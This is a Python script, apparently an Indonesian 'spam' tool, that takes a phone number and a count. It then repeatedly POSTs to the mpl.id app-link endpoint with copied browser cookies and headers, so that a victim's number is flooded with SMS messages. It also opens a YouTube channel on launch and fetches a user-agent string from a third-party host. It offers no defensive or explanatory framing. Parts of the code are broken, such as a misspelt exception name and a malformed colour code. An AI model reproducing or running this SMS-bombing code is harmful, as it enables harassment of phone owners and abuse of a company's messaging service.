import os,requests,sys,time,json,requests
from colorama import Fore,Back,init

B = Fore.BLUE
W = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
Y = Fore.YELLOW

ip=requests.get('https://api.ipify.org').text
ua=requests.get('http://xenzi-ganz.6te.net/User-Agent.php').text
localtime=time.asctime(time.localtime(time.time()))

Hijau="\033[1;92m "
putih="\033[1;97m"
abu="\033[1;90m"
kuning="\033[1;93m"
ungu="\033[1;95m"
merah="33[37;1m"
biru="\033[1;96m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41mText\033[1;0m"

def logo():
	try:
		os.system("clear")
		print (f"Subscribe Dulu Sluur {G}✓")
		os.system("xdg-open https://youtube.com/channel/UCFeZ5BGt8lbOZwIj2MNOlIQ")
		time.sleep(3)
		os.system("clear")
		print (f"""
{putih}███████{R}╗{putih}██████{R}╗{putih}  █████{R}╗{putih} ███{R}╗{putih}   ███{R}╗ {putih}[{Y}•{putih}] Creator{R}:{biru}AmmarBN
{putih}██{R}╔════╝{putih}██{R}╔══{putih}██{R}╗{putih}██{R}╔══{putih}██{R}╗{putih}████{R}╗{putih} ████{R}║
{putih}███████{R}╗{putih}██████{R}╔╝{putih}███████{R}║{putih}██{R}╔{putih}████{R}╔{putih}██{R}║ {putih}[{Y}•{putih}] Youtube{R}:{biru}Ammar Executed
{R}╚════{putih}██{R}║{W}██{R}╔═══╝ {W}██{R}╔══{W}██{R}║{W}██{R}║╚{W}██{R}╔╝{W}██{R}║
{W}███████{R}║{W}██{R}║{W}     ██{R}║{W}  ██{R}║{W}██{R}║ ╚═╝{W} ██{R}║ {putih}[{Y}•{putih}] Github{R}:{biru}github.com/Lord-Ammar
{R}╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝
{putih}[{ungu}•{putih}] Ip{R}:{Y}{ip}	{putih}██{R}╗{putih}   ██{R}╗{putih}███{R}╗{putih}   ██{R}╗{putih}██{R}╗{putih}     ██{R}╗
{putih}[{ungu}•{putih}] Example{R}:{Y}8xxxxx	{putih}██{R}║{putih}   ██{R}║{putih}████{R}╗{putih}  ██{R}║{putih}██{R}║{putih}     ██{R}║
{putih}[{ungu}•{putih}] Server{R}:{Y}mpl.id	{putih}██{R}║{putih}   ██{R}║{putih}██{R}╔{putih}██{R}╗{putih} ██{R}║{putih}██{R}║{putih}     ██{R}║
{putih}[{ungu}•{putih}] Info{R}:{Y}Unlimited	{putih}██{R}║{putih}   ██{R}║{putih}██{R}║╚{putih}██{R}╗{putih}██{R}║{putih}██{R}║{putih}     ██{R}║
			{R}╚{putih}██████{R}╔╝{putih}██{R}║ ╚{putih}████{R}║{putih}███████{R}╗{putih}██{R}║
			{R} ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝
{abu}<-------------------------------------------------------------------->
""")
	except requests.execeptions.ConnectionError:
	        exit(f"{W}[{R}!{W}] Maaf Koneksi Tidak Stabil ")

try:
	logo()
	nomor = sys.argv[1]
	jumlah = sys.argv[2]
	cookies = {
	    '_gaexp': 'GAX1.2.UUilJBiHTsWHPnCyxNimqg.19193.2',
	    '_gcl_au': '1.1.573656529.1650419690',
	    '_ga': 'GA1.2.456978477.1650419690',
	    '_gid': 'GA1.2.1393701864.1650419690',
	    '_fbp': 'fb.1.1650419690597.1564396679',
	    '_gat_UA-136971790-1': '1',
	    'RT': '"z=1&dm=www.mpl.id&si=b5d3838e-986b-40a8-bddf-c3ec42a2147c&ss=l27jn0sf&sl=1&tt=38w&rl=1&ld=398&nu=3ywsa5du&cl=8s8"',
	}
	
	headers = {
	    'authority': 'www.mpl.id',
	    'accept': 'application/json',
	    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
	    'origin': 'https://www.mpl.id',
	    'referer': 'https://www.mpl.id/',
	    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Microsoft Edge";v="100"',
	    'sec-ch-ua-mobile': '?0',
	    'sec-ch-ua-platform': '"Windows"',
 	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.44',
	}
	
	json_data = {
	    'To': '+62'+nomor,
	    'VAR1': 'DEFAULT',
	}
	for i in range(int(jumlah)):
	    response = requests.post('https://www.mpl.id/api/applink', headers=headers, cookies=cookies, json=json_data).text
	    if "status" in response:
		    print (f"{W}[{Y}{localtime}{W}] {W}[{G}✓{W}] Sukses Spam Unlimited")
		    time.sleep(1)
	    else:
		    print (f"{W}[{Y}{localtime}{W}] {W}[{R}×{W}] Gagal Spam Unlimited")
	print ("Spam Selesai ✓")
except IndexError:
	exit(f"	{Y} >{R}! {W}Usage{G}:{Y}python tes.py {abu}<nomor> <jumlahspam>")
except requests.execeptions.ConnectionError:
	exit(f"{W}[{R}!{W}] Maaf Koneksi Tidak Stabil ")
